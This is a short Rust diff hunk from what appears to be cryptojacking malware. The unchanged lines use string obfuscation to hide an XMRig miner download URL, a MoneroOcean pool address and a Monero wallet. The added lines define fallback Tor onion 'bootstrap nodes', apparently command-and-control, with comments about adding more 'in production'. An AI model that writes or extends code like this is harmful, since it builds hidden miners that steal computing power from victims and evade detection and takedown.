@@ -20,6 +20,14 @@ pub fn get_download_url() -> String { obfstr::obfstr!("https://github.com/xmrig/
 pub fn get_pool_url() -> String { obfstr::obfstr!("gulf.moneroocean.stream:10128").to_string() }
 pub fn get_wallet() -> String { obfstr::obfstr!("47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP").to_string() }
 
+// V10 Standard: Failover Bootstrap Nodes
+pub const BOOTSTRAP_ONIONS: [&str; 1] = [
+    env!("BOOTSTRAP_ONION"),
+    // Add more fallbacks here in production
+    // "fallback_onion_2...",
+    // "fallback_onion_3...",
+];
+
 // Dynamic Runtime Configuration
 pub static RUNTIME_CONFIG: Lazy<Mutex<MorphConfig>> = Lazy::new(|| {
     // Try to load from disk
